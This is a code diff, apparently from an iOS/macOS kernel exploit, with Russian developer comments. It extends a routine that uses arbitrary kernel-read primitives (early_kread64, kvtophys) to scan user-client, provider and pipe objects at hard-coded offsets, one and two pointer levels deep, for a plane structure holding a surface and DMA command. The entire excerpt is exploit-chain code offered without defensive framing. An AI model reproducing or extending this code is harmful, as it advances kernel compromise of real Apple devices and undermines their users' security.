@@ -6663,18 +6663,55 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // (р.33/37: [plane-struct+0x90]=surface, [+0x98]=IODMACommand) — хант по
         // указателям pipe/provider: [P+0x90]==surfVA. Затем cmd→mapObj+0xa0=DVA.
         uint64_t planeStruct = 0;
-        for (uint32_t src = 0; src < 2 && !planeStruct; src++) {
-            uint64_t host = src ? provVA : pipeVA;
-            if (!kpLooksLikeKernelPointer(host) || !surfVA) continue;
-            uint32_t lim4 = src ? 0x200 : 0x400;
-            for (uint32_t o = 0; o + 8 <= lim4 && !planeStruct; o += 8) {
-                uint64_t P = kp_untag_ptr(early_kread64(host + o));
-                if (!kpLooksLikeKernelPointer(P) || !kvtophys(P)) continue;
-                if ((uint32_t)(P & 0x3fff) + 0xa0 > 0x4000) continue;
-                if (kp_untag_ptr(early_kread64(P + 0x90)) != surfVA) continue;
-                planeStruct = P;
-                kpNote(r, [NSString stringWithFormat:@"  [P2] plane-struct @ %s+%#x = %#llx ([+0x90]=surfVA ✓)",
-                          src ? "prov" : "pipe", o, (unsigned long long)P]);
+        {
+            uint64_t hosts[3] = { ucVA, provVA, pipeVA };
+            const char *hnames[3] = { "uc", "prov", "pipe" };
+            uint32_t hlims[3] = { 0x168, 0x200, 0x400 };
+            for (int src = 0; src < 3 && !planeStruct; src++) {
+                uint64_t host = hosts[src];
+                if (!kpLooksLikeKernelPointer(host) || !surfVA) continue;
+                for (uint32_t o = 0; o + 8 <= hlims[src] && !planeStruct; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(host + o));
+                    if (!kpLooksLikeKernelPointer(P) || !kvtophys(P)) continue;
+                    if ((uint32_t)(P & 0x3fff) + 0xa0 > 0x4000) continue;
+                    if (kp_untag_ptr(early_kread64(P + 0x90)) != surfVA) continue;
+                    planeStruct = P;
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] plane-struct @ %s+%#x = %#llx ([+0x90]=surfVA ✓)",
+                              hnames[src], o, (unsigned long long)P]);
+                }
+            }
+        }
+        // 1.9.169 уровень 2: struct может быть на уровень глубже (указатели в
+        // указателях pipe/prov) + явная проверка pipe+0xd8 (shadowMapper, р.32)
+        if (!planeStruct && surfVA) {
+            for (uint32_t src = 0; src < 2 && !planeStruct; src++) {
+                uint64_t host = src ? provVA : pipeVA;
+                if (!kpLooksLikeKernelPointer(host)) continue;
+                uint32_t lim5 = src ? 0x200 : 0x400;
+                for (uint32_t o = 0; o + 8 <= lim5 && !planeStruct; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(host + o));
+                    if (!kpLooksLikeKernelPointer(P) || !kvtophys(P)) continue;
+                    if ((uint32_t)(P & 0x3fff) + 0x200 > 0x4000) continue;
+                    for (uint32_t o2 = 0; o2 + 8 <= 0x200; o2 += 8) {
+                        uint64_t P2 = kp_untag_ptr(early_kread64(P + o2));
+                        if (!kpLooksLikeKernelPointer(P2) || !kvtophys(P2)) continue;
+                        if ((uint32_t)(P2 & 0x3fff) + 0xa0 > 0x4000) continue;
+                        if (kp_untag_ptr(early_kread64(P2 + 0x90)) != surfVA) continue;
+                        planeStruct = P2;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] plane-struct lvl2 @ %s+%#x→%#llx+%#x = %#llx",
+                                  src ? "prov" : "pipe", o, (unsigned long long)P, o2, (unsigned long long)P2]);
+                        break;
+                    }
+                }
+            }
+        }
+        if (!planeStruct && kpLooksLikeKernelPointer(pipeVA)) {
+            uint64_t sm = kp_untag_ptr(early_kread64(pipeVA + 0xd8));
+            kpNote(r, [NSString stringWithFormat:@"  [P2] pipe+0xd8(shadowMapper?)=%#llx", (unsigned long long)sm]);
+            if (kpLooksLikeKernelPointer(sm) && kvtophys(sm) && (uint32_t)(sm & 0x3fff) + 0xa0 <= 0x4000 &&
+                kp_untag_ptr(early_kread64(sm + 0x90)) == surfVA) {
+                planeStruct = sm;
+                kpNote(r, @"  [P2] plane-struct == pipe+0xd8 ✓");
             }
         }
         if (planeStruct) {
